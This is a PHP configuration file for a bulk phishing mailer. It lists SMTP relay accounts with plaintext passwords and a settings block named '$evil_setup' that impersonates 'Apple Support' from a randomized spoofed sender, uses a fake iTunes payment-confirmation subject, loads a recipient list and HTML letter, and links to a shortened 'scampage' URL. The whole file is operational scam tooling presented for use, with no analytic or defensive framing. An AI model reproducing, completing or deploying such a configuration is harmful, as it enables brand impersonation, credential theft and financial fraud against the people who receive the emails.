<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "send1@soopterus.net",
        "password" => "kumahasia123"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "send1@soopterus.net",
        "password" => "kumahasia123"
    ],
    /*[
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "omen2@cepotkosombong2.com",
        "password" => "kumahasia123"
    ],*/

];

/* Features SETUP */

$evil_setup = [
    "priority"       => 0,
    "userandom"      => 1,
    "sleeptime"      => 10,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 1,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "Apple Support",
    "frommail"       => "##randstring##.noreply.##randstring##@payment.websecure.mailsupport-intl4.business",
    "subject"        => "[Re] Confirmation your payment iTunes music Membership.",
    "msgfile"        => "file/letter/2.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["http://ow.ly/kKXr30jOf9n"],
];
